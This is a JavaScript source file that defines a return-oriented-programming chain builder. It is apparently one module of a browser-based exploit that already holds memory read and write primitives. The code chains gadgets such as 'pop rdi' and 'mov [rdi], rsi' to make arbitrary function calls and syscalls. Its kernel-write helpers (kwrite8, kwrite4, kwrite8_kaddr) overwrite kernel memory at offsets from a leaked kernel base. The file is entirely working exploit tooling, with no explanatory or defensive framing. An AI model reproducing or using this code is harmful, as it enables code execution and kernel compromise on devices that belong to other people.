const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }
    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};